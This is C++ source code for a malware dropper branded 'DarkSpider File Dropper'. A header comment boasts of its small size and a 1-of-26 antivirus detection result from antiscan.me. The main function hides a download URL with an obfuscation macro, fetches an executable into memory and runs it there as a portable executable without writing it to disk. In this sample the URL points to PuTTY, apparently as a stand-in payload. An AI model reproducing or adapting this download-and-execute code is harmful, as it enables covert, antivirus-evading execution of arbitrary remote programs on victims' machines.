/*
________                __      _________      .__    .___
\______ \ _____ _______|  | __ /   _____/_____ |__| __| _/___________
 |    |  \\__  \\_  __ \  |/ / \_____  \\____ \|  |/ __ |/ __ \_  __ \
 |    `   \/ __ \|  | \/    <  /        \  |_> >  / /_/ \  ___/|  | \/
/_______  (____  /__|  |__|_ \/_______  /   __/|__\____ |\___  >__|
		\/     \/           \/        \/|__|           \/    \/
___________.__.__           ________
\_   _____/|__|  |   ____   \______ \_______  ____ ______   ___________
 |    __)  |  |  | _/ __ \   |    |  \_  __ \/  _ \\____ \_/ __ \_  __ \
 |     \   |  |  |_\  ___/   |    `   \  | \(  <_> )  |_> >  ___/|  | \/
 \___  /   |__|____/\___  > /_______  /__|   \____/|   __/ \___  >__|
	 \/                 \/          \/             |__|        \/

This Droper has 10kb
1/26
//https://antiscan.me/scan/new/result?id=dZ2cAANnrxn9
*/

#include "spiderrun.h"
#include "obfuscat.h"

int main()
{
	std::string hiddenUrl = OBFUSCATE("http://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");
	LPVOID FileData = DownloadURLToBuffer(hiddenUrl.c_str());
	RunPortableExecutable(FileData);
	ExitProcess(0);
}